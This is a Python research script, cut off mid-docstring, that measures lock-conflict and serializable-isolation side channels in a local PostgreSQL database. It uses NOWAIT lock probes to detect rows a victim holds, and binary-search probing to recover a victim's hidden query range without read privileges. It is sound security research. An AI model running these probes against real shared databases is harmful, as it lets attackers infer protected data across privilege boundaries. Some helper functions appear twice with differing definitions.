#!/usr/bin/env python3
"""
pg_conflict_leakage_experiments.py
===================================

Reproduces, against a LOCAL Postgres instance, the experiments discussed for
the thesis:

    "Concurrency control is intentionally data-access dependent: transactions
     interact differently depending on whether their read/write sets conflict.
     If an attacker can observe blocking/aborts/retries/validation failures,
     they may learn relationships between protected accesses without directly
     reading tuple values."

Requirements
------------
    pip install "psycopg[binary]"

A local Postgres server must be running and reachable. E2dit DSN below (or set
the PG_DSN environment variable) if your connection details differ from the
default ("dbname=postgres user=postgres host=localhost port=5432").
The connecting role needs CREATE privileges on the target database.

The script is idempotent: every experiment resets its own data first, so you
can re-run the whole file, or individual experiments via --exp, repeatedly
and get directly comparable results.

Usage
-----
    python pg_conflict_leakage_experiments.py                 # run everything
    python pg_conflict_leakage_experiments.py --exp 1 3        # run only exp 1 and 3
    python pg_conflict_leakage_experiments.py --quick          # fewer trials, faster smoke test

Experiments
-----------
    1. Oracle baseline        -- can a non-reading attacker detect, via
                                  SELECT ... FOR UPDATE NOWAIT, whether a
                                  victim transaction is holding a lock on a
                                  specific row?
    1.1 Update-only attacker  -- can an attacker with ZERO SELECT privileges
                                  (only UPDATE privilege on the table) observe
                                  any conflict leakage?
    2. Lock-mode conflict matrix -- empirically reconstruct which row-lock
                                  modes (FOR UPDATE / NO KEY UPDATE / SHARE /
                                  KEY SHARE) conflict with which, confirming
                                  that the *existence* of a conflict signal is
                                  governed by well-defined, documented rules.
    3. SSI predicate-range leak -- under SERIALIZABLE, use serialization
                                  failures (SQLSTATE 40001) as a binary oracle
                                  to recover the bounds of a victim's hidden
                                  `WHERE balance BETWEEN lo AND hi` predicate
                                  via binary search -- i.e. leak a *predicate*,
                                  not just a tuple identity.
    3.1 RLS SSI predicate leak -- under Row-Level Security (RLS), can an attacker
                                  infer a victim's query over hidden rows (e.g. row 1)
                                  by pivoting through a shared row (row 2)?
    4. Noise / realism test   -- repeat experiment 1 under background OLTP-like
                                  load from many concurrent clients and with a
                                  short victim lock-hold time, to see whether
                                  the channel survives realistic conditions.
    5. Observability tiers    -- check what a privileged observer actually
                                  sees in pg_locks/pg_stat_activity during a
                                  victim transaction (row-level locks are NOT
                                  separately enumerated there).
    6. Mitigation comparison  -- show that forcing coarser locking (a full
                                  table lock) destroys the row-identity signal
                                  (everything conflicts, so nothing is learned)
                                  at the cost of concurrency.

Every experiment prints its own results; nothing is written to disk other
than the Postgres tables it creates in your target database.
"""

import argparse
import os
import random
import statistics
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

import psycopg
from psycopg import errors as pg_errors

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DSN = os.environ.get("PG_DSN", "dbname=postgres")
TABLE = "scc_accounts"          # scc = "side-channel concurrency"; isolated namespace
VICTIM_ROLE = "scc_victim"
ATTACKER_ROLE = "scc_attacker"
ATTACKER_UPDATE_ONLY_ROLE = "scc_attacker_update_only"
N_ACCOUNTS = 500000                 # size of the base dataset
RNG_SEED = 1337                  # fixed seed -> reproducible probe sequences

random.seed(RNG_SEED)


# ---------------------------------------------------------------------------
# Connection helpers
# ---------------------------------------------------------------------------
def connect(autocommit: bool = False, isolation_level: Optional["psycopg.IsolationLevel"] = None, role: Optional[str] = None):
    """
    Open a fresh connection. Each "actor" (victim / attacker / observer) in
    every experiment gets its OWN connection, because the whole point is to
    model them as separate, mutually un-trusting database sessions.
    """
    conn = psycopg.connect(DSN)
    conn.autocommit = autocommit
    if isolation_level is not None:
        # Must be set before the transaction actually starts (i.e. before the
        # first statement runs), which is why we set it immediately here.
        conn.isolation_level = isolation_level
    if role is not None:
        conn.execute(f"SET ROLE {role}")
    return conn


def safe_rollback(conn):
    """Roll back if there's an open transaction; ignore errors on closed/aborted conns."""
    try:
        conn.rollback()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Schema setup
# ---------------------------------------------------------------------------
def setup_schema():
    """Create the experiment table + supporting index if they don't exist yet."""
    with connect(autocommit=True) as conn:
        conn.execute(f"""
            CREATE TABLE IF NOT EXISTS {TABLE} (
                account_id  INTEGER PRIMARY KEY,
                balance     NUMERIC NOT NULL
            )
        """)
        # An index on balance is what allows experiment 3's SERIALIZABLE range
        # query to take an index-range SIREAD predicate lock instead of
        # falling back to a relation-level predicate lock.
        conn.execute(f"CREATE INDEX IF NOT EXISTS {TABLE}_balance_idx ON {TABLE}(balance)")
    print(f"[setup] table '{TABLE}' ready")


def setup_roles_and_privileges():
    """
    Enforces real PostgreSQL role privilege separation:
      - scc_victim:   has SELECT and UPDATE on the table (can read and modify data).
      - scc_attacker: has UPDATE on the table and SELECT ONLY on account_id,
                      with NO SELECT privilege on the secret data ('balance').
                      This allows the attacker to execute `SELECT 1 ... FOR UPDATE NOWAIT`
                      (row locking) on target account_ids, but strictly forbids reading
                      any balances (SELECT balance throws InsufficientPrivilege).
      - scc_attacker_update_only: has ONLY UPDATE on the table, and NO SELECT privilege
                      on ANY column (not even account_id). Used for Experiment 1.1.
    """
    with connect(autocommit=True) as conn:
        try:
            conn.execute(f"""
                DO $$
                BEGIN
                    IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = '{VICTIM_ROLE}') THEN
                        CREATE ROLE {VICTIM_ROLE};
                    END IF;
                    IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = '{ATTACKER_ROLE}') THEN
                        CREATE ROLE {ATTACKER_ROLE};
                    END IF;
                    IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = '{ATTACKER_UPDATE_ONLY_ROLE}') THEN
                        CREATE ROLE {ATTACKER_UPDATE_ONLY_ROLE};
                    END IF;
                END
                $$;
            """)
            conn.execute(f"GRANT {VICTIM_ROLE} TO CURRENT_USER")
            conn.execute(f"GRANT {ATTACKER_ROLE} TO CURRENT_USER")
            conn.execute(f"GRANT {ATTACKER_UPDATE_ONLY_ROLE} TO CURRENT_USER")
        except pg_errors.InsufficientPrivilege:
            pass

        try:
            conn.execute(f"GRANT USAGE ON SCHEMA public TO {VICTIM_ROLE}, {ATTACKER_ROLE}, {ATTACKER_UPDATE_ONLY_ROLE}")
        except Exception:
            pass

        # Revoke existing grants on the table
        conn.execute(f"REVOKE ALL ON TABLE {TABLE} FROM PUBLIC")
        conn.execute(f"REVOKE ALL ON TABLE {TABLE} FROM {VICTIM_ROLE}, {ATTACKER_ROLE}, {ATTACKER_UPDATE_ONLY_ROLE}")

        # Victim gets both SELECT and UPDATE
        conn.execute(f"GRANT SELECT, UPDATE ON TABLE {TABLE} TO {VICTIM_ROLE}")

        # Attacker (Exp 1): UPDATE + SELECT ONLY on account_id (cannot read balance)
        conn.execute(f"GRANT UPDATE ON TABLE {TABLE} TO {ATTACKER_ROLE}")
        conn.execute(f"GRANT SELECT (account_id) ON TABLE {TABLE} TO {ATTACKER_ROLE}")

        # Attacker Update-Only (Exp 1.1): ONLY UPDATE on table, NO SELECT ON ANY COLUMN
        conn.execute(f"GRANT UPDATE ON TABLE {TABLE} TO {ATTACKER_UPDATE_ONLY_ROLE}")

    print(f"[setup] roles '{VICTIM_ROLE}', '{ATTACKER_ROLE}', and '{ATTACKER_UPDATE_ONLY_ROLE}' configured")

def generate_striped_order(n: int, stride: int = 1000) -> list:
    """
    Returns a permutation of 1..n where consecutive values jump forward by
    `stride` repeatedly, then drop back down to a small value once the
    current 'column' is exhausted and the next one starts.

    e.g. with stride=1000: 1, 1001, 2001, 3001, ..., then 2, 1002, 2002, ...,
    then 3, 1003, 2003, ..., and so on until all of 1..n have been emitted
    exactly once.

    This defeats the near-sequential-fill packing that strictly ascending
    inserts give a B-tree index (always appending at the current maximum
    key), so leaf pages end up holding keys that arrived at very different
    times/positions in the insert order -- closer to what a real, long-lived
    table's index actually looks like.
    """
    order = []
    for offset in range(1, stride + 1):
        v = offset
        while v <= n:
            order.append(v)
            v += stride
    return order


def reset_data_expt3(n: int = N_ACCOUNTS, striped: bool = False, stride: int = 1000):
    """
    Wipe and reseed the table.

    striped=False (default): fast bulk insert via a single
        `INSERT ... SELECT generate_series(...)`, account_id/balance inserted
        in strict ascending order 1..n. Fine for the row-lock experiments
        (1, 2, 4, 5, 6), where physical page layout doesn't matter.

    striped=True: inserts the SAME set of rows {1..n}, but in the jump-around
        order from generate_striped_order(), via COPY for speed even at
        hundreds of thousands of rows. Use this for Experiment 3, so its
        B-tree index isn't artificially tightly packed by insertion order.
    """
    with connect(autocommit=True) as conn:
        conn.execute(f"TRUNCATE {TABLE}")

        if not striped:
            conn.execute(
                f"INSERT INTO {TABLE} (account_id, balance) "
                f"SELECT i, i FROM generate_series(1, %s) AS i",
                (n,),
            )
            return

        order = generate_striped_order(n, stride=stride)
        with conn.cursor() as cur:
            with cur.copy(f"COPY {TABLE} (account_id, balance) FROM STDIN") as copy:
                for v in order:
                    copy.write_row((v, v))

def reset_data(n: int = N_ACCOUNTS):
    """
    Wipe and reseed the table with a deterministic, dense keyspace:
    account_id in [1..n], balance == account_id (so a numeric range on
    `balance` corresponds predictably to a contiguous block of rows).
    """
    with connect(autocommit=True) as conn:
        print(f"[data] reseeding '{TABLE}' with {n:,} rows (this takes ~15-25s)...", end="", flush=True)
        conn.execute(f"TRUNCATE {TABLE}")
        conn.execute(
            f"INSERT INTO {TABLE} (account_id, balance) "
            f"SELECT i, i FROM generate_series(1, %s) AS i",
            (n,),
        )
        print(" done.", flush=True)


def random_other_id(x: int, n: int = N_ACCOUNTS) -> int:
    """Return a uniformly random account_id in [1..n] that is NOT x."""
    y = random.randint(1, n)
    while y == x:
        y = random.randint(1, n)
    return y


# ---------------------------------------------------------------------------
# EXPERIMENT 1 -- Oracle baseline
# ---------------------------------------------------------------------------
def exp1_oracle_baseline(n_trials: int = 200, victim_hold_s: float = 0.15):
    """
    For each trial:
      - A victim opens a transaction and UPDATEs one row (account_id = x),
        holding the transaction open (simulating normal in-flight work).
      - An attacker -- who has NO SELECT privilege modeled here, only the
        ability to attempt a lock -- probes a row y via
        `SELECT ... FOR UPDATE NOWAIT`.
      - Half the trials probe y == x (should conflict), half probe a random
        y != x (should not conflict).
    We measure whether "lock acquisition failed" is a reliable predictor of
    "the victim is touching this exact row" -- i.e. the oracle's accuracy.
    """
    print("\n=== Experiment 1: Oracle baseline (SELECT ... FOR UPDATE NOWAIT) ===")
    setup_roles_and_privileges()
    reset_data()

    # Verify that real privilege separation is active:
    try:
        with connect(autocommit=True, role=ATTACKER_ROLE) as chk:
            chk.execute(f"SELECT balance FROM {TABLE} LIMIT 1")
            print("[privileges] Warning: Attacker unexpectedly read balance!")
    except pg_errors.InsufficientPrivilege:
        print("[privileges] Verified: scc_attacker CANNOT select 'balance' (permission denied).")

    tp = tn = fp = fn = 0  # confusion-matrix counters relative to "is_match"

    for trial in range(n_trials):
        x = random.randint(1, N_ACCOUNTS)
        is_match = (trial % 2 == 0)
        y = x if is_match else random_other_id(x)

        victim_ready = threading.Event()
        release_victim = threading.Event()

        def victim_thread():
            conn = connect(role=VICTIM_ROLE)
            try:
                conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (x,))
                victim_ready.set()
                release_victim.wait(timeout=5)
            finally:
                safe_rollback(conn)
                conn.close()

        t = threading.Thread(target=victim_thread)
        t.start()
        victim_ready.wait(timeout=5)
        time.sleep(0.01)  # tiny settle margin so the lock is definitely registered

        # Attacker probe: autocommit so this is a single, self-contained
        # implicit transaction that releases its own lock immediately.
        attacker = connect(autocommit=True, role=ATTACKER_ROLE)
        predicted_conflict = False
        try:
            attacker.execute(f"SELECT 1 FROM {TABLE} WHERE account_id = %s FOR UPDATE NOWAIT", (y,))
        except pg_errors.LockNotAvailable:
            predicted_conflict = True
        finally:
            attacker.close()

        release_victim.set()
        t.join(timeout=5)

        # Score against ground truth (is_match == victim is really touching y)
        if is_match and predicted_conflict:
            tp += 1
        elif is_match and not predicted_conflict:
            fn += 1
        elif not is_match and predicted_conflict:
            fp += 1
        else:
            tn += 1

    total = tp + tn + fp + fn
    accuracy = (tp + tn) / total
    print(f"trials={total}  TP={tp} TN={tn} FP={fp} FN={fn}")
    print(f"attacker accuracy at distinguishing 'victim touched this exact row': {accuracy:.3f}")
    print("Interpretation: accuracy near 1.0 confirms the oracle exists; "
          "near 0.5 means the channel carries no information.")


# ---------------------------------------------------------------------------
# EXPERIMENT 1.1 -- Attacker with ONLY UPDATE privilege (NO SELECT on any column)
# ---------------------------------------------------------------------------
def exp1_1_update_only_probe(n_trials: int = 50, victim_hold_s: float = 0.15):
    """
    Experiment 1.1: Can an attacker leak concurrency conflict info if granted
    ONLY UPDATE privilege on the table and ZERO SELECT privileges on ANY column
    (not even account_id)?

    Setup:
      - Victim has SELECT and UPDATE privileges.
      - Attacker (scc_attacker_update_only) has UPDATE privilege on the table,
        but NO SELECT privilege on any column (account_id or balance).

    Hypothesis & Empirical Test:
      In PostgreSQL, filtering with `WHERE account_id = y` (whether in a
      `SELECT ... FOR UPDATE` or an `UPDATE` statement) requires SELECT privilege
      on `account_id`. Because permission checking happens during query compilation/
      planning BEFORE any row-level locking or conflict evaluation, the attacker's
      probes should immediately fail with SQLSTATE 42501 (InsufficientPrivilege).
      As a result, no conflict signal can be observed, and NO LEAKAGE OCCURS.
    """
    print("\n=== Experiment 1.1: Attacker with ONLY UPDATE privilege (NO SELECT on any column) ===")
    setup_roles_and_privileges()
    reset_data()

    print("[privilege check] Verifying attacker has NO SELECT on ANY column:")
    with connect(autocommit=True, role=ATTACKER_UPDATE_ONLY_ROLE) as chk:
        # Check 1: SELECT balance
        try:
            chk.execute(f"SELECT balance FROM {TABLE} LIMIT 1")
            print("  - SELECT balance:    ALLOWED (unexpected!)")
        except pg_errors.InsufficientPrivilege:
            print("  - SELECT balance:    DENIED (expected: InsufficientPrivilege)")

        # Check 2: SELECT account_id
        try:
            chk.execute(f"SELECT account_id FROM {TABLE} LIMIT 1")
            print("  - SELECT account_id: ALLOWED (unexpected!)")
        except pg_errors.InsufficientPrivilege:
            print("  - SELECT account_id: DENIED (expected: InsufficientPrivilege)")

    perm_denied_select = 0
    perm_denied_update = 0
    conflicts_detected = 0

    print(f"\nRunning {n_trials} trials to check if conflict leakage can occur...")
    for trial in range(n_trials):
        x = random.randint(1, N_ACCOUNTS)
        is_match = (trial % 2 == 0)
        y = x if is_match else random_other_id(x)

        victim_ready = threading.Event()
        release_victim = threading.Event()

        def victim_thread():
            conn = connect(role=VICTIM_ROLE)
            try:
                conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (x,))
                victim_ready.set()
                release_victim.wait(timeout=5)
            finally:
                safe_rollback(conn)
                conn.close()

        t = threading.Thread(target=victim_thread)
        t.start()
        victim_ready.wait(timeout=5)
        time.sleep(0.01)

        # Probe 1: SELECT ... FOR UPDATE NOWAIT
        attacker = connect(autocommit=True, role=ATTACKER_UPDATE_ONLY_ROLE)
        try:
            attacker.execute(f"SELECT 1 FROM {TABLE} WHERE account_id = %s FOR UPDATE NOWAIT", (y,))
        except pg_errors.LockNotAvailable:
            conflicts_detected += 1
        except pg_errors.InsufficientPrivilege:
            perm_denied_select += 1
        finally:
            attacker.close()

        # Probe 2: UPDATE ... WHERE account_id = y (with lock_timeout so it never hangs)
        attacker2 = connect(autocommit=True, role=ATTACKER_UPDATE_ONLY_ROLE)
        try:
            attacker2.execute("SET lock_timeout = '50ms'")
            attacker2.execute(f"UPDATE {TABLE} SET balance = 0 WHERE account_id = %s", (y,))
        except (pg_errors.LockNotAvailable, pg_errors.QueryCanceled):
            conflicts_detected += 1
        except pg_errors.InsufficientPrivilege:
            perm_denied_update += 1
        finally:
            attacker2.close()

        release_victim.set()
        t.join(timeout=5)

    print(f"\nResults over {n_trials} trials:")
    print(f"  Probes blocked by permission check (SELECT ... FOR UPDATE): {perm_denied_select}/{n_trials}")
    print(f"  Probes blocked by permission check (UPDATE ... WHERE):       {perm_denied_update}/{n_trials}")
    print(f"  Lock conflicts detected:                                     {conflicts_detected}/{n_trials * 2}")

    print("\nInterpretation:")
    if conflicts_detected == 0 and (perm_denied_select + perm_denied_update) == n_trials * 2:
        print("  -> RESULT: NO LEAK HAPPENS.")
        print("     In PostgreSQL, targeting a row via `WHERE account_id = y` requires SELECT")
        print("     privilege on `account_id`, even when using an UPDATE command or table-level UPDATE.")
        print("     Because PostgreSQL enforces permission checks during query planning BEFORE")
        print("     evaluating row locks, all probe queries are immediately rejected with")
        print("     'permission denied' (SQLSTATE 42501).")
        print("     The attacker cannot observe whether the victim is holding a lock.")
    else:
        print(f"  -> RESULT: Leak observed ({conflicts_detected} conflicts detected).")


# ---------------------------------------------------------------------------
# EXPERIMENT 2 -- Lock-mode conflict matrix
# ---------------------------------------------------------------------------
LOCK_MODES = ["FOR UPDATE", "FOR NO KEY UPDATE", "FOR SHARE", "FOR KEY SHARE"]


def _probe_lock_conflict(x: int, y: int, victim_mode: str, attacker_mode: str) -> bool:
    """
    Victim takes `victim_mode` on row x and holds it; attacker attempts
    `attacker_mode` NOWAIT on row y. Returns True iff the attacker's probe
    was blocked (i.e. a conflict was observed).
    """
    victim_ready = threading.Event()
    release_victim = threading.Event()

    def victim_thread():
        conn = connect()
        try:
            conn.execute(f"SELECT 1 FROM {TABLE} WHERE account_id = %s {victim_mode}", (x,))
            victim_ready.set()
            release_victim.wait(timeout=5)
        finally:
            safe_rollback(conn)
            conn.close()

    t = threading.Thread(target=victim_thread)
    t.start()
    victim_ready.wait(timeout=5)
    time.sleep(0.01)

    attacker = connect(autocommit=True)
    conflict = False
    try:
        attacker.execute(f"SELECT 1 FROM {TABLE} WHERE account_id = %s {attacker_mode} NOWAIT", (y,))
    except pg_errors.LockNotAvailable:
        conflict = True
    finally:
        attacker.close()

    release_victim.set()
    t.join(timeout=5)
    return conflict


def exp2_lock_mode_matrix():
    """
    Reconstructs the row-level lock conflict table purely by observation
    (same row), and runs the same matrix on a non-overlapping row as a
    negative control (must be all "no conflict").
    """
    print("\n=== Experiment 2: Lock-mode conflict matrix (empirically derived) ===")
    reset_data()
    x, y_same = 1, 1
    y_diff = 2

    print("\n-- Same row (x == y): expect the documented Postgres conflict table --")
    header = "victim \\ attacker".ljust(20) + "".join(m[4:].rjust(14) for m in LOCK_MODES)
    print(header)
    for vmode in LOCK_MODES:
        row = [vmode[4:].ljust(19)]
        for amode in LOCK_MODES:
            conflict = _probe_lock_conflict(x, y_same, vmode, amode)
            row.append(("CONFLICT" if conflict else "ok").rjust(14))
        print("".join(row))

    print("\n-- Different rows (negative control): expect NO conflicts anywhere --")
    any_unexpected = False
    for vmode in LOCK_MODES:
        for amode in LOCK_MODES:
            conflict = _probe_lock_conflict(x, y_diff, vmode, amode)
            if conflict:
                any_unexpected = True
                print(f"  UNEXPECTED conflict: victim={vmode} attacker={amode}")
    if not any_unexpected:
        print("  confirmed: independent rows never conflict, as expected.")


# ---------------------------------------------------------------------------
# EXPERIMENT 3 -- SSI predicate-range leak via binary search
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# EXPERIMENT 3 -- SSI predicate-range leak via binary search (write-skew),
#                 with per-probe lock snapshots and a tight-vs-spaced
#                 comparison to separate genuine page-width from cross-probe
#                 lock-state contamination.
# ---------------------------------------------------------------------------
_probe_counter = [N_ACCOUNTS + 1_000_000]  # account_ids reserved for attacker probe rows
CONTROL_ID = N_ACCOUNTS + 3_000_000        # a dedicated "pivot" row used to force a 2-cycle


def _next_probe_id() -> int:
    _probe_counter[0] += 1
    return _probe_counter[0]


def generate_striped_order(n: int, stride: int = 1000) -> list:
    """Returns a permutation of 1..n that jumps forward by `stride` instead of
    inserting in strict ascending order, so the B-tree isn't artificially
    packed to ~100% fill by always-appending inserts."""
    order = []
    for offset in range(1, stride + 1):
        v = offset
        while v <= n:
            order.append(v)
            v += stride
    return order


def reset_data(n: int = N_ACCOUNTS, striped: bool = False, stride: int = 1000):
    """Wipe and reseed the table. striped=True uses a jump-around insert order via COPY."""
    with connect(autocommit=True) as conn:
        conn.execute(f"TRUNCATE {TABLE}")
        if not striped:
            conn.execute(
                f"INSERT INTO {TABLE} (account_id, balance) "
                f"SELECT i, i FROM generate_series(1, %s) AS i",
                (n,),
            )
            return
        order = generate_striped_order(n, stride=stride)
        with conn.cursor() as cur:
            with cur.copy(f"COPY {TABLE} (account_id, balance) FROM STDIN") as copy:
                for v in order:
                    copy.write_row((v, v))


def _explain_predicate_query(true_lo: int, true_hi: int):
    """DIAGNOSTIC 1: confirm the victim's query uses an index scan, not a seq scan."""
    with connect(autocommit=True) as conn:
        plan = conn.execute(
            f"EXPLAIN SELECT sum(balance) FROM {TABLE} WHERE balance BETWEEN %s AND %s",
            (true_lo, true_hi),
        ).fetchall()
    print("\n[diagnostic 1] query plan for the victim's predicate read:")
    uses_index = False
    for (line,) in plan:
        print(f"  {line}")
        if "Index" in line and "Scan" in line:
            uses_index = True
    print("  -> uses an index scan" if uses_index else "  -> WARNING: seq scan")
    return uses_index


def _snapshot_siread_locks() -> list:
    """
    Query pg_locks for ALL current SIReadLock entries, on ANY relation
    (heap table AND index -- the earlier bug was filtering this to the heap
    only, which hid the index-side locking that actually protects against
    phantom inserts). Returns a list of (relation_name, locktype, page) tuples.
    """
    with connect(autocommit=True) as conn:
        rows = conn.execute("""
            SELECT relation::regclass AS rel, locktype, page
            FROM pg_locks
            WHERE mode = 'SIReadLock'
            ORDER BY rel, locktype, page NULLS FIRST
        """).fetchall()
    return [(str(rel), locktype, page) for rel, locktype, page in rows]


def _inspect_siread_lock_granularity(true_lo: int, true_hi: int, hold_s: float = 1.0):
    """DIAGNOSTIC 2: one isolated snapshot of SIReadLocks held by a single,
    standalone predicate read (no probing activity happening concurrently)."""
    victim_ready = threading.Event()
    release_victim = threading.Event()

    def victim_thread():
        conn = connect(isolation_level=psycopg.IsolationLevel.SERIALIZABLE)
        try:
            conn.execute(
                f"SELECT sum(balance) FROM {TABLE} WHERE balance BETWEEN %s AND %s",
                (true_lo, true_hi),
            )
            victim_ready.set()
            release_victim.wait(timeout=hold_s + 5)
            conn.commit()
        except Exception:
            safe_rollback(conn)
        finally:
            conn.close()

    t = threading.Thread(target=victim_thread)
    t.start()
    victim_ready.wait(timeout=5)
    time.sleep(0.05)

    snapshot = _snapshot_siread_locks()

    release_victim.set()
    t.join(timeout=5)

    print("\n[diagnostic 2] SIReadLock entries for an isolated, standalone predicate read:")
    if not snapshot:
        print("  (none found -- try increasing hold_s)")
    for rel, locktype, page in snapshot:
        print(f"  relation={rel:<28} locktype={locktype:<10} page={page}")


def _probe_ssi_conflict(candidate_value: float, true_lo: int, true_hi: int,
                         snapshot_log: Optional[list] = None) -> bool:
    """
    ONE binary-search probe, as a two-transaction write-skew cycle (see
    prior docstrings for the full mechanism). NEW: synchronizes a third
    party (the calling/main thread) into the same "both reads are done"
    rendezvous point, so a pg_locks snapshot can be taken at EXACTLY the
    moment both transactions have read but neither has written yet --
    i.e. the precise window where the real lock footprint for this probe
    is visible, before any cleanup or cross-probe interference.
    If snapshot_log is given, (candidate_value, snapshot) is appended to it.
    """
    outcome = {"victim_failed": False, "attacker_failed": False}
    # Two synchronization points, 3 parties each (victim, attacker, main/observer):
    #   barrier_reads_done : released once both reads + the observer have arrived
    #   barrier_proceed     : released once the observer has taken its snapshot
    barrier_reads_done = threading.Barrier(3, timeout=10)
    barrier_proceed = threading.Barrier(3, timeout=10)
    probe_id = _next_probe_id()

    def victim_thread():
        conn = connect(isolation_level=psycopg.IsolationLevel.SERIALIZABLE)
        try:
            conn.execute(
                f"SELECT sum(balance) FROM {TABLE} WHERE balance BETWEEN %s AND %s",
                (true_lo, true_hi),
            )
            barrier_reads_done.wait()
            barrier_proceed.wait()
            conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (CONTROL_ID,))
            conn.commit()
        except pg_errors.SerializationFailure:
            outcome["victim_failed"] = True
            safe_rollback(conn)
        except threading.BrokenBarrierError:
            safe_rollback(conn)
        finally:
            conn.close()

    def attacker_thread():
        conn = connect(isolation_level=psycopg.IsolationLevel.SERIALIZABLE)
        try:
            conn.execute(f"SELECT balance FROM {TABLE} WHERE account_id = %s", (CONTROL_ID,))
            barrier_reads_done.wait()
            barrier_proceed.wait()
            conn.execute(
                f"INSERT INTO {TABLE} (account_id, balance) VALUES (%s, %s)",
                (probe_id, candidate_value),
            )
            conn.commit()
        except pg_errors.SerializationFailure:
            outcome["attacker_failed"] = True
            safe_rollback(conn)
        except threading.BrokenBarrierError:
            safe_rollback(conn)
        finally:
            conn.close()

    t1 = threading.Thread(target=victim_thread)
    t2 = threading.Thread(target=attacker_thread)
    t1.start()
    t2.start()

    # Main thread acts as the third rendezvous party: wait for both reads,
    # snapshot pg_locks right then, then release both threads to write.
    try:
        barrier_reads_done.wait(timeout=10)
        if snapshot_log is not None:
            snapshot_log.append((candidate_value, _snapshot_siread_locks()))
    except threading.BrokenBarrierError:
        pass
    finally:
        try:
            barrier_proceed.wait(timeout=10)
        except threading.BrokenBarrierError:
            pass

    t1.join(timeout=10)
    t2.join(timeout=10)

    with connect(autocommit=True) as cleanup:
        cleanup.execute(f"DELETE FROM {TABLE} WHERE account_id = %s", (probe_id,))

    return outcome["victim_failed"] or outcome["attacker_failed"]


def _find_left_boundary(conflicts: Callable[[float], bool], lo: int, known_true: int) -> int:
    while lo < known_true:
        mid = (lo + known_true) // 2
        if conflicts(mid):
            known_true = mid
        else:
            lo = mid + 1
    return known_true


def _find_right_boundary(conflicts: Callable[[float], bool], known_true: int, hi: int) -> int:
    while known_true < hi:
        mid = (known_true + hi + 1) // 2
        if conflicts(mid):
            known_true = mid
        else:
            hi = mid - 1
    return known_true


def _run_binary_search(true_lo, true_hi, search_min, search_max, probe_delay_s, snapshot_log):
    """One full binary-search run; returns (left, right, probe_log)."""
    probe_log = []

    def conflicts(v):
        result = _probe_ssi_conflict(v, true_lo, true_hi, snapshot_log=snapshot_log)
        probe_log.append((v, result))
        if probe_delay_s > 0:
            time.sleep(probe_delay_s)
        return result

    seed_value = None
    step = max(1, (search_max - search_min) // 40)
    v = search_min
    while v <= search_max:
        if conflicts(v):
            seed_value = v
            break
        v += step

    if seed_value is None:
        return None, None, probe_log

    left = _find_left_boundary(conflicts, search_min, seed_value)
    right = _find_right_boundary(conflicts, seed_value, search_max)
    return left, right, probe_log


def exp3_ssi_predicate_leak(true_lo: int = 150, true_hi: int = 170,
                             search_min: int = 1, search_max: int = N_ACCOUNTS,
                             striped: bool = True, stride: int = 1000,
                             spaced_delay_s: float = 0.5):
    """
    Full Experiment 3: diagnostics 1 and 2, then TWO binary-search runs for
    direct comparison --
        (a) tight loop: probes fire back-to-back, no delay (original behavior)
        (b) spaced out: `spaced_delay_s` pause between probes

    If (a) recovers a much wider range than (b), that's evidence the tight
    loop is accumulating cross-probe SSI bookkeeping state. If both runs
    recover similarly wide ranges, the width is a genuine, delay-independent
    property of the lock/predicate mechanism itself.

    Per-probe pg_locks snapshots are printed for both runs so you can see
    exactly which pages were held at the moment of each conflict, not just
    the final recovered boundaries.
    """
    print(f"\n=== Experiment 3: SSI predicate-range leak via binary search (write-skew) ===")
    print(f"(ground truth, hidden from the 'attacker' logic: victim range = [{true_lo}, {true_hi}])")
    reset_data(striped=striped, stride=stride)

    with connect(autocommit=True) as conn:
        conn.execute(
            f"INSERT INTO {TABLE} (account_id, balance) VALUES (%s, 0) "
            f"ON CONFLICT (account_id) DO NOTHING",
            (CONTROL_ID,),
        )

    _explain_predicate_query(true_lo, true_hi)
    _inspect_siread_lock_granularity(true_lo, true_hi)

    def report_run(label, left, right, probe_log, snapshot_log):
        print(f"\n[{label}] per-probe trace and lock snapshot at each probe:")
        snap_by_value = dict(snapshot_log)
        for val, hit in probe_log:
            snap = snap_by_value.get(val, [])
            snap_str = "; ".join(f"{rel}:{lt}:{pg}" for rel, lt, pg in snap) or "(no locks captured)"
            print(f"  v={val:<8} -> {'CONFLICT' if hit else 'ok':<8} locks=[{snap_str}]")
        if left is None:
            print(f"[{label}] no conflicting value found in coarse scan.")
            return None
        print(f"[{label}] recovered range: [{left}, {right}]  ({len(probe_log)} probes)")
        return right - left

    print("\n--- Run A: tight loop (no delay between probes) ---")
    snap_log_a = []
    left_a, right_a, log_a = _run_binary_search(true_lo, true_hi, search_min, search_max, 0.0, snap_log_a)
    width_a = report_run("Run A / tight loop", left_a, right_a, log_a, snap_log_a)

    print(f"\n--- Run B: spaced out ({spaced_delay_s}s delay between probes) ---")
    snap_log_b = []
    left_b, right_b, log_b = _run_binary_search(true_lo, true_hi, search_min, search_max, spaced_delay_s, snap_log_b)
    width_b = report_run("Run B / spaced out", left_b, right_b, log_b, snap_log_b)

    print(f"\n=== Comparison ===")
    print(f"actual range width:        {true_hi - true_lo}")
    print(f"Run A (tight) width:       {width_a}")
    print(f"Run B (spaced) width:      {width_b}")
    if width_a is not None and width_b is not None:
        if width_a > width_b * 2:
            print("-> Run A is much wider than Run B: strong evidence of cross-probe lock-state")
            print("   contamination when probes fire back-to-back without a gap.")
        elif abs(width_a - width_b) < max(width_a, width_b) * 0.2:
            print("-> Both runs recover similarly wide ranges: the width looks like a genuine,")
            print("   delay-independent property of the locking mechanism, not a timing artifact.")
        else:
            print("-> Partial effect: spacing reduced but didn't eliminate the width -- both a")
            print("   locking-granularity effect and some cross-probe interaction may be present.")


# ---------------------------------------------------------------------------
# EXPERIMENT 3.1 -- RLS SSI Predicate Leak via Shared Pivot Row
# ---------------------------------------------------------------------------
RLS_TABLE = "scc_rls_orders"
RLS_VICTIM_ROLE = "scc_rls_victim"
RLS_ATTACKER_ROLE = "scc_rls_attacker"


def setup_rls_schema():
    """
    Sets up a Row-Level Security (RLS) environment with 4 rows:
      Row 1: account_id=1, order_id=11, balance=100  -> Visible ONLY to victim
